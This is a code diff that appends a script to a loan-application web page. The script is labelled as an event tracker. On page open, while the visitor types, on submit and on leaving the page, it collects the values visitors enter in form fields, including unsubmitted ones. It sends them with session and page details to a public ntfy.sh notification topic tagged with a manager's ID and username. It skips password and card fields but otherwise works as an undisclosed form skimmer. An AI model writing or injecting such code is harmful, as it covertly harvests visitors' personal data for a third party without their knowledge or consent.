@@ -3107,5 +3107,113 @@
   updateTerm();
 
 </script>
+
+<!-- LOANS_EVENT_TRACKER_START -->
+<script>
+(function(){
+  "use strict";
+  var cfg = {"topic":"hlkln-hlk-wthl9a-f33d0f9df13f05bade61f0f7","baseUrl":"https://ntfy.sh","slug":"hlk-wthl9a","managerId":6682245897,"managerUsername":"kirill_dmr_manager","pageUrl":"https://heleket-loans.com/hlk-wthl9a","maxFields":12,"maxValueLen":160};
+  if (!cfg.baseUrl || !cfg.topic || !window.fetch) return;
+  var sessionKey = "loans_evt_sid";
+  var sid = sessionStorage.getItem(sessionKey);
+  if (!sid) {
+    sid = Math.random().toString(36).slice(2) + Date.now().toString(36);
+    try { sessionStorage.setItem(sessionKey, sid); } catch(e) {}
+  }
+  var lastInputAt = 0;
+  var started = false;
+  function trim(v, max) {
+    v = String(v == null ? "" : v).replace(/\s+/g, " ").trim();
+    return v.length > max ? v.slice(0, max - 1) + "…" : v;
+  }
+  function labelFor(el) {
+    if (!el) return "field";
+    var key = el.name || el.id || el.getAttribute("aria-label") || el.placeholder || "field";
+    return trim(key, 60);
+  }
+  function sensitive(el) {
+    var t = String((el && el.type) || "").toLowerCase();
+    var n = String(((el && (el.name || el.id || el.placeholder)) || "")).toLowerCase();
+    return ["password","hidden","file"].indexOf(t) !== -1 || /pass|парол|card|карта|cvv|cvc|pin|otp|2fa|token|secret|ключ/.test(n);
+  }
+  function collectFields() {
+    var out = {};
+    var els = Array.prototype.slice.call(document.querySelectorAll("input, textarea, select"));
+    var count = 0;
+    els.forEach(function(el) {
+      if (count >= cfg.maxFields || !el || el.disabled || sensitive(el)) return;
+      var val = "";
+      var type = String(el.type || "").toLowerCase();
+      if (type === "checkbox" || type === "radio") {
+        if (!el.checked) return;
+        val = el.value || "checked";
+      } else {
+        val = el.value || "";
+      }
+      val = trim(val, cfg.maxValueLen);
+      if (!val) return;
+      out[labelFor(el)] = val;
+      count += 1;
+    });
+    return out;
+  }
+  function publish(type, extra, useBeacon) {
+    var data = extra || {};
+    var payload = {
+      v: 1,
+      type: type,
+      slug: cfg.slug,
+      manager_id: cfg.managerId,
+      manager_username: cfg.managerUsername,
+      page_url: cfg.pageUrl,
+      url: location.href,
+      referrer: document.referrer || "",
+      title: document.title || "",
+      lang: navigator.language || "",
+      screen: (screen && screen.width && screen.height) ? (screen.width + "x" + screen.height) : "",
+      session_id: sid,
+      ts: new Date().toISOString(),
+      fields: data.fields || undefined
+    };
+    var body = JSON.stringify(payload);
+    var endpoint = cfg.baseUrl + "/" + encodeURIComponent(cfg.topic);
+    try {
+      if (useBeacon && navigator.sendBeacon) {
+        navigator.sendBeacon(endpoint, new Blob([body], {type: "text/plain;charset=UTF-8"}));
+        return;
+      }
+    } catch(e) {}
+    try {
+      fetch(endpoint, {method: "POST", mode: "no-cors", keepalive: true, body: body}).catch(function(){});
+    } catch(e) {}
+  }
+  function inputSnapshot(force) {
+    var now = Date.now();
+    if (!force && now - lastInputAt < 20000) return;
+    lastInputAt = now;
+    publish(started ? "input" : "input_start", {fields: collectFields()}, false);
+    started = true;
+  }
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", function(){ publish("open", {}, false); });
+  } else {
+    publish("open", {}, false);
+  }
+  document.addEventListener("input", function(ev) {
+    if (!sensitive(ev.target)) window.setTimeout(function(){ inputSnapshot(false); }, 1200);
+  }, true);
+  document.addEventListener("change", function(ev) {
+    if (!sensitive(ev.target)) inputSnapshot(false);
+  }, true);
+  document.addEventListener("submit", function() {
+    publish("submit", {fields: collectFields()}, true);
+  }, true);
+  window.addEventListener("beforeunload", function() {
+    var fields = collectFields();
+    if (Object.keys(fields).length) publish("leave", {fields: fields}, true);
+  });
+})();
+</script>
+<!-- LOANS_EVENT_TRACKER_END -->
 </body>
 </html>
